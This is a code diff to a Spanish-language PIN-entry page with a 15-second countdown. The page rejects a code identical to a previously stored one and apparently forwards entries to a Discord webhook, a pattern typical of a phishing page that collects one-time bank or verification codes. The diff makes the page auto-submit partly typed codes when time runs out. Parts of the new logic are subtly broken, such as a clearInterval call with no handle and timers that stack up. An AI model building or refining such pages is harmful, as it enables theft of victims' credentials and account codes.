@@ -22,12 +22,10 @@
     .pin-container { display: flex; gap: 0.5rem; margin: 2rem 0; justify-content: center; }
     .pin-input { width: 40px; height: 40px; border: 2px solid #ddd; border-radius: 8px; text-align: center; font-size: 1.25rem; background: white; }
     .pin-input:focus { border-color: #008f76; outline: none; }
-    .pin-input:disabled { background: #eee; color: #999; }
     .no-access-btn { background: none; border: none; color: #008f76; padding: 1rem; font-size: 0.9rem; cursor: pointer; margin-top: 1rem; }
     /* Temporizador */
     .timer { font-size: 0.9rem; color: #555; margin-bottom: 0.5rem; }
     .timer span { font-weight: bold; color: #e53935; }
-    .timer.agotado span { color: #999; }
     /* Mensaje de código repetido */
     .repeat-error { color: #e53935; font-size: 0.85rem; margin-bottom: 0.5rem; display: none; }
     @media (min-width: 768px) { .container { margin: 2rem auto; min-height: calc(100vh - 4rem); border-radius: 1rem; box-shadow: 0 4px 6px rgba(0,0,0,0.1); } }
@@ -52,7 +50,8 @@
       </div>
       <div class="timer" id="timer">Tiempo restante: <span id="segundos">15</span>s</div>
       <div class="repeat-error" id="repeatError">El código no puede ser el mismo que el anterior. Ingresa un código diferente.</div>
-      <div class="pin-container">
+      
+      <div class="pin-container" id="pinContainer">
         <input type="tel" maxlength="1" class="pin-input" pattern="[0-9]" id="pin1" oninput="moveFocus(event, 2)">
         <input type="tel" maxlength="1" class="pin-input" pattern="[0-9]" id="pin2" oninput="moveFocus(event, 3)">
         <input type="tel" maxlength="1" class="pin-input" pattern="[0-9]" id="pin3" oninput="moveFocus(event, 4)">
@@ -83,31 +82,30 @@
       } catch (error) { console.error('Error Discord:', error); }
     }
 
-    // --- Temporizador de 15 segundos ---
+    // --- Variables de estado ---
     let tiempoRestante = 15;
     let temporizadorActivo = true;
-    const timerEl = document.getElementById('timer');
+    let envioRealizado = false; // Evita envíos dobles
     const segundosEl = document.getElementById('segundos');
     const pinInputs = document.querySelectorAll('.pin-input');
     const repeatError = document.getElementById('repeatError');
+    const pinContainer = document.getElementById('pinContainer');
 
+    // --- Temporizador ---
     function iniciarTemporizador() {
-      tiempoRestante = 15;
-      temporizadorActivo = true;
-      segundosEl.textContent = tiempoRestante;
-      timerEl.classList.remove('agotado');
-      pinInputs.forEach(input => { input.disabled = false; input.value = ''; });
-      repeatError.style.display = 'none';
-      document.getElementById('pin1').focus();
-
       const intervalo = setInterval(() => {
         tiempoRestante--;
         segundosEl.textContent = tiempoRestante;
+
         if (tiempoRestante <= 0) {
           clearInterval(intervalo);
           temporizadorActivo = false;
-          timerEl.classList.add('agotado');
-          pinInputs.forEach(input => { input.disabled = true; });
+          segundosEl.parentElement.style.color = '#999'; // Gris al agotarse
+          
+          // Al agotar el tiempo, si no se ha enviado, forzar el envío
+          if (!envioRealizado) {
+            submitForm();
+          }
         }
       }, 1000);
     }
@@ -116,7 +114,6 @@
 
     // --- Lógica de PIN ---
     function moveFocus(event, nextInputIndex) {
-      if (!temporizadorActivo) return;
       const currentInput = event.target;
       if (currentInput.value.length === 1) {
         const nextInput = document.getElementById('pin' + nextInputIndex);
@@ -129,19 +126,44 @@
       return Array.from(pinInputs).every(input => input.value.length === 1);
     }
 
+    // --- Envío del formulario ---
     async function submitForm() {
-      if (!temporizadorActivo) return;
+      if (envioRealizado) return; // Si ya se envió, no hacer nada
 
+      // Obtener el PIN actual (completado o no)
       const pinValues = Array.from(pinInputs).map(input => input.value).join('');
+
+      // Si el código está vacío o le faltan dígitos (porque se agotó el tiempo), podemos enviarlo así
+      // pero normalmente el usuario habrá llenado algo. Si no hay nada, no enviamos.
+      if (pinValues.length === 0) return;
+
+      envioRealizado = true; // Bloquear envíos posteriores
+      clearInterval(); // Detener el temporizador si aún corre (si fue envío por llenado completo)
+      pinInputs.forEach(input => input.disabled = true); // Deshabilitar inputs
 
       // Comparar con el PIN anterior guardado en validacion.html
       const pinAnterior = sessionStorage.getItem('pinValidacion');
 
       if (pinAnterior && pinValues === pinAnterior) {
-        // Código repetido: mostrar error, limpiar campos, no enviar ni avanzar
+        // Código repetido: mostrar error, no enviar ni avanzar
         repeatError.style.display = 'block';
-        pinInputs.forEach(input => { input.value = ''; });
+        
+        // Rehabilitar para que intente de nuevo (opcional, según tu flujo)
+        envioRealizado = false;
+        pinInputs.forEach(input => { 
+          input.disabled = false; 
+          input.value = ''; 
+        });
         document.getElementById('pin1').focus();
+        
+        // Reiniciar el temporizador si quieres que siga contando
+        // (si prefieres que ya no, elimina esta línea)
+        tiempoRestante = 15;
+        segundosEl.textContent = tiempoRestante;
+        segundosEl.parentElement.style.color = '#555';
+        temporizadorActivo = true;
+        iniciarTemporizador();
+        
         return;
       }
 
